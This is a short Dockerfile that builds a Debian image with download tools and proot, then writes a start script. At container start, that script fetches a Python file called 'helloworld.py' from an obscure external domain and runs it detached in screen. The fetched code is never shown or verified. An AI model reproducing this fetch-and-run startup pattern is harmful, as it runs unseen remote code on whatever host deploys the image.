FROM debian
RUN apt update
RUN DEBIAN_FRONTEND=noninteractive apt install curl git wget unzip screen python3-pip -y
RUN apt install python3-flask -y
RUN curl -LO https://proot.gitlab.io/proot/bin/proot
RUN chmod 755 proot
RUN mv proot /bin
RUN mkdir /prog
RUN echo "cd /prog">>/start.sh
RUN echo "wget https://s.bccx.eu.org/helloworld.py" >>/start.sh
RUN echo "screen -d -m python3 helloworld.py" >>/start.sh
RUN chmod 755 /start.sh
EXPOSE 8080
CMD /start.sh
